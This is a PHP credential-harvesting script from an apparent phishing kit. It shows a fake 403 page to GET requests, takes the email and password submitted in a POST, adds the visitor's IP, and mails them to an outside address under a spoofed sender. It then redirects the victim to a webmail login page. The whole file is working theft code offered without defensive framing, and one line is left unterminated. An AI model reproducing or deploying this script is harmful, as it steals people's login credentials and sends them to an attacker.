<?

if ($_SERVER['REQUEST_METHOD'] == 'GET')
{
print '
<html><head>
<title>403 - Forbidden</title>
</head><body>
<h1>403 Forbidden</h1>
<p></p>
<hr>
</body></html>
';
exit;
}


$ip = getenv("REMOTE_ADDR");
$message  = "---------------+ Rezult +--------------\n";
$message .= "Email: ".$_POST['username_ex']."\n";
$message .= "Password: ".$_POST['password']."\n";
$message .= "Client IP: ".$ip."\n";
$message .= "---------------+ Created By HardWork +-----------------\n";
$send = "anthonylucashpf@protonmail.com";
$subject = " |$ip";
$headers = "From: HardWork <logs@linkedin.edu>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail($send,$subject,$message,$headers);
header("Location: https://mx2.htc.net/surgeweb;

?>